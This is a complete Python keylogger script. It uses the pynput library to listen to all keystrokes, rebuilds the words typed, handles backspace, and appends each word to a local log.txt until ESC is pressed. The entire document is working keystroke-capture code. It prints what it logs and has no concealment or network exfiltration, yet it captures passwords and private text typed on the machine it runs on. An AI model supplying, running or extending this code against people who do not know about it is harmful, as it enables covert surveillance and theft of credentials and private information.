import pynput
from pynput.keyboard import Key, Listener

class WordKeylogger:
    def __init__(self, filename="log.txt"):
        self.filename = filename
        self.current_word = ""  # Buffer to build the current word

    def on_press(self, key):
        try:
            # Handle alphanumeric characters (a-z, 0-9, punctuation)
            self.current_word += key.char
        except AttributeError:
            # Handle special keys (Space, Enter, Backspace, Shift, etc.)
            if key == Key.space or key == Key.enter:
                self.save_word()
            elif key == Key.backspace:
                # If they hit backspace, remove the last character from memory
                self.current_word = self.current_word[:-1]
            # Any other key (Shift, Ctrl, Alt, Caps Lock, Arrows) is completely ignored

    def save_word(self):
        # Only save if there is actually text in the buffer
        if self.current_word.strip():
            try:
                with open(self.filename, "a") as f:
                    f.write(self.current_word + " ")
                print(f"[+] Logged word: '{self.current_word}'") # Visual verification
            except IOError as e:
                print(f"\n[!] Error writing to file: {e}")
            
            # Reset the buffer for the next word
            self.current_word = ""

    def on_release(self, key):
        if key == Key.esc:
            print("\n[!] Exiting...")
            # Save whatever was being typed before hitting ESC
            self.save_word()
            return False

    def start(self):
        print(f"[+] Word logger started. Saving to '{self.filename}'...")
        print("[+] Press 'ESC' to stop.")
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    logger = WordKeylogger()
    logger.start()
    